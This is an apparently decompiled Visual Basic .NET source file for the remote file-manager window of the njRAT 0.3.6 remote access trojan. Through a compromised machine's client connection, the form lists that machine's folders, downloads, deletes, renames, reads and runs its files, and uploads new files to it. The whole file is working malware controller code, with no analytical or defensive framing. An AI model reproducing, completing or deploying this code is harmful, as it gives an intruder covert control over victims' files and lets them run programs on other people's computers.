Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Windows.Forms
Imports njRAT_0._3._6.njRAT

Public Class FM
    Public Cache As Collection
    Public Images As Collection
    Public osk As Client
    Public P As PictureBox
    Public QQ As String
    Public sk As Client

    Public Sub New()
        Me.Images = New Collection
        Me.QQ = ""
        Me.Cache = New Collection
        Dim box As New PictureBox
        Dim size As New Size(160, 120)
        box.Size = size
        box.BackColor = Color.Black
        box.SizeMode = PictureBoxSizeMode.Zoom
        Me.P = box
        Me.InitializeComponent()
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        If (Me.L2.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Dim s As String = "dl"
            Try
                enumerator = Me.L2.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    If (current.Text <> "..") Then
                        If (current.SubItems.Item(2).Text = "DIR") Then
                            s = (s & ind.Y & FN.ENB((current.ToolTipText & ";*")))
                        Else
                            s = (s & ind.Y & FN.ENB((current.ToolTipText & ";")))
                        End If
                    End If
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            Me.sk.Send(s)
        End If
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        Try
            Dim enumerator As IEnumerator = Me.L2.SelectedItems.GetEnumerator()
            While enumerator.MoveNext()
                Dim listViewItem As ListViewItem = CType(enumerator.Current, ListViewItem)
                If Operators.CompareString(listViewItem.Text, "..", False) <> 0 Then
                    If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0 Then
                        Dim arg_80_0 As Client = Me.sk
                        Dim arg_7B_0 As String = "dw"
                        Dim arg_7B_1 As String = ind.Y
                        Dim listViewItem2 As ListViewItem = listViewItem
                        Dim toolTipText As String = listViewItem2.ToolTipText
                        Dim arg_7B_2 As String = FN.ENB(toolTipText)
                        listViewItem2.ToolTipText = toolTipText
                        arg_80_0.Send(arg_7B_0 + arg_7B_1 + arg_7B_2)
                    End If
                End If
            End While
        Finally
            Dim enumerator As IEnumerator
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub EditToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditToolStripMenuItem.Click
        If (Me.L2.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Dim s As String = "rd"
            Try
                enumerator = Me.L2.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    If (current.SubItems.Item(2).Text <> "DIR") Then
                        Dim item2 As ListViewItem = current
                        Dim toolTipText As String = item2.ToolTipText
                        item2.ToolTipText = toolTipText
                        s = (s & ind.Y & FN.ENB(toolTipText))
                    End If
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            Me.sk.Send(s)
        End If
    End Sub
    Public Sub exp(ByVal x As String, Optional ByVal Refresh As Boolean = False)
        Try
            Dim pr As ToolStripProgressBar = Me.pr
            SyncLock pr
                Me.P.Image = Nothing
                Me.P.Visible = False
                Me.TextBox1.BackColor = Color.IndianRed
                Dim key As String = x.Replace("\\", "\")
                If Not key.EndsWith("\") Then
                    key = (key & "\")
                End If
                Me.TextBox1.Text = key
                If (Refresh AndAlso Me.Cache.Contains(key)) Then
                    Me.Cache.Remove(key)
                End If
                If Me.Cache.Contains(key) Then
                    Dim bar2 As ToolStripProgressBar
                    Me.TextBox1.BackColor = Color.Pink
                    Dim mcach As FMcach = DirectCast(Me.Cache.Item(key), FMcach)
                    Me.pr.Value = 0
                    Me.pr.Maximum = (mcach.files.Count + mcach.folders.Count)
                    Me.L2.Items.Clear()
                    If (Not New DirectoryInfo(key).Parent Is Nothing) Then
                        Dim item As ListViewItem = Me.L2.Items.Add("..", "..", 0)
                        item.SubItems.Add("")
                        item.SubItems.Add("DIR")
                        item.ToolTipText = (New DirectoryInfo(key).Parent.FullName & "\")
                        item = Nothing
                    End If
                    Dim str2 As String
                    For Each str2 In mcach.folders
                        bar2 = Me.pr
                        bar2.Value += 1
                        Dim item2 As ListViewItem = Me.L2.Items.Add(str2, New DirectoryInfo(str2).Name, 0)
                        item2.SubItems.Add("")
                        item2.SubItems.Add("DIR")
                        item2.ToolTipText = str2
                        item2 = Nothing
                    Next
                    Dim str3 As String
                    For Each str3 In mcach.files
                        bar2 = Me.pr
                        bar2.Value += 1
                        Dim strArray As String() = Strings.Split(str3, ";", -1, CompareMethod.Binary)
                        Dim info As New FileInfo(strArray(0))
                        Dim item3 As ListViewItem = Me.L2.Items.Add(info.FullName, info.Name, 1)
                        item3.ToolTipText = info.FullName
                        item3.SubItems.Add(strArray(1))
                        item3.SubItems.Add(strArray(2))
                        If (info.Extension.Length > 0) Then
                            If Not Me.MG2.Images.ContainsKey(info.Extension) Then
                                File.Create((Application.StartupPath & "\!" & info.Extension)).Close()
                                Me.MG2.Images.Add(info.Extension, Icon.ExtractAssociatedIcon((Application.StartupPath & "\!" & info.Extension)))
                                File.Delete((Application.StartupPath & "\!" & info.Extension))
                                item3.ImageKey = info.Extension
                            Else
                                item3.ImageKey = info.Extension
                            End If
                        End If
                        item3 = Nothing
                    Next
                    Me.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Me.pr.Value = 0
                Else
                    Me.sk.Send(("!" & ind.Y & FN.ENB(key)))
                End If
            End SyncLock
        Catch ex As Exception

        End Try

    End Sub


    Private Sub FM_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            Me.P.Dispose()
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
        Try
            Me.Images.Clear()
        Catch exception4 As Exception
            ProjectData.SetProjectError(exception4)
            ProjectData.ClearProjectError()
        End Try
        Try
            Me.Cache.Clear()
        Catch exception5 As Exception
            ProjectData.SetProjectError(exception5)
            ProjectData.ClearProjectError()
        End Try
        Me.sk.CN = False
    End Sub

    Private Sub FM_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.L2.Controls.Add(Me.P)
        Me.P.BringToFront()
        Me.P.Visible = False
        Me.P.BorderStyle = BorderStyle.FixedSingle
        Me.QQ = Conversions.ToString(ind.vno(Me.osk.L))
        Me.Text = Me.QQ
        Me.sk.Send("~")
    End Sub

    Private Sub FM_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Me.P.Left = ((Me.L2.Width - Me.P.Width) - &H19)
        Me.P.Top = ((Me.L2.Height - Me.P.Height) - &H19)
    End Sub

    Private Sub L1_DoubleClick(sender As Object, e As EventArgs) Handles L1.DoubleClick
        If (Me.L1.SelectedItems.Count <> 0) Then
            Me.exp(Me.L1.SelectedItems.Item(0).ToolTipText, False)
        End If
    End Sub

    Private Sub L2_DoubleClick(sender As Object, e As EventArgs) Handles L2.DoubleClick
        If (Me.L2.SelectedItems.Count <> 0) Then
            If (Me.L2.SelectedItems.Item(0).SubItems.Item(2).Text = "DIR") Then
                Me.exp(Me.L2.SelectedItems.Item(0).ToolTipText, False)
            Else
                Dim item As ListViewItem = Me.L2.SelectedItems.Item(0)
                Dim toolTipText As String = item.ToolTipText
                item.ToolTipText = toolTipText
                Me.sk.Send(("rd" & ind.Y & FN.ENB(toolTipText)))
            End If
        End If
    End Sub

    Private Sub L2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L2.SelectedIndexChanged
        Me.P.Image = Nothing
        Me.P.Visible = False
        If (Me.L2.SelectedItems.Count = 1) Then
            Dim item As ListViewItem = Me.L2.SelectedItems.Item(0)
            If Me.Images.Contains(item.ToolTipText) Then
                Me.P.Image = DirectCast(Me.Images.Item(item.ToolTipText), Image)
                Me.P.Visible = True
            ElseIf ".jpg.jpeg.png.ico.bmp.tiff.gif".Contains(item.SubItems.Item(2).Text.ToLower) Then
                Dim item2 As ListViewItem = item
                Dim toolTipText As String = item2.ToolTipText
                item2.ToolTipText = toolTipText
                Me.sk.Send(("#" & ind.Y & FN.ENB(toolTipText)))
            End If
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Me.sk.Send("~")
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L2.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.Text <> "..") Then
                    If (current.SubItems.Item(2).Text = "DIR") Then
                        Dim str As String = Interaction.InputBox("", "Rename", current.Text, -1, -1)
                        If (str.Length > 0) Then
                            Me.sk.Send(("nm" & ind.Y & FN.ENB((current.ToolTipText & ";" & str & ";*"))))
                        End If
                    Else
                        Dim str2 As String = Interaction.InputBox("", "Rename", current.Text, -1, -1)
                        If (str2.Length > 0) Then
                            Me.sk.Send(("nm" & ind.Y & FN.ENB((current.ToolTipText & ";" & str2 & ";"))))
                        End If
                    End If
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub RunToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunToolStripMenuItem.Click
        If (Me.L2.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Dim s As String = "rn"
            Try
                enumerator = Me.L2.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim item2 As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim toolTipText As String = item2.ToolTipText
                    item2.ToolTipText = toolTipText
                    s = (s & ind.Y & FN.ENB(toolTipText))
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            Me.sk.Send(s)
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If ((Me.osk Is Nothing) Or (Me.sk Is Nothing)) Then
            Dim enumerator As IEnumerator
            Me.Timer1.Enabled = False
            Try
                enumerator = Me.Controls.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As Control = DirectCast(enumerator.Current, Control)
                    current.Enabled = False
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        ElseIf (Not Me.osk.CN Or Not Me.sk.CN) Then
            Dim enumerator2 As IEnumerator
            Me.Timer1.Enabled = False
            Try
                enumerator2 = Me.Controls.GetEnumerator
                Do While enumerator2.MoveNext
                    Dim control2 As Control = DirectCast(enumerator2.Current, Control)
                    control2.Enabled = False
                Loop
            Finally
                If TypeOf enumerator2 Is IDisposable Then
                    TryCast(enumerator2, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub ToolStripStatusLabel1_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel1.Click
        If (Me.TextBox1.Text.Length > 0) Then
            Me.exp(Me.TextBox1.Text, True)
        End If
    End Sub

    Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click
        If (Me.L2.Items.Count <> 0) Then
            Dim text As String = Me.TextBox1.Text
            Dim dialog As New OpenFileDialog
            dialog.FileName = ""
            If ((dialog.ShowDialog = DialogResult.OK) AndAlso (FileSystem.FileLen(dialog.FileName) <> 0)) Then
                Dim up As New up
                up.TMP = dialog.FileName
                up.FN = ([text] & "\" & New FileInfo(dialog.FileName).Name).Replace("\\", "\")
                up.Name = (Me.sk.ip & FN.ENB(up.FN))
                up.c = Me.sk
                up.SZ = CInt(FileSystem.FileLen(up.TMP))
                up.Text = (New FileInfo(up.TMP).Name & " >> " & up.FN)
                up.Show()
            End If
        End If
    End Sub

    Private Sub UPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UPToolStripMenuItem.Click
        If Me.L2.Items.ContainsKey("..") Then
            Me.exp(Me.L2.Items.Item("..").ToolTipText, False)
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem1.Click
        If (Me.TextBox1.Text.Length > 0) Then
            Me.exp(Me.TextBox1.Text, True)
        End If
    End Sub

   
End Class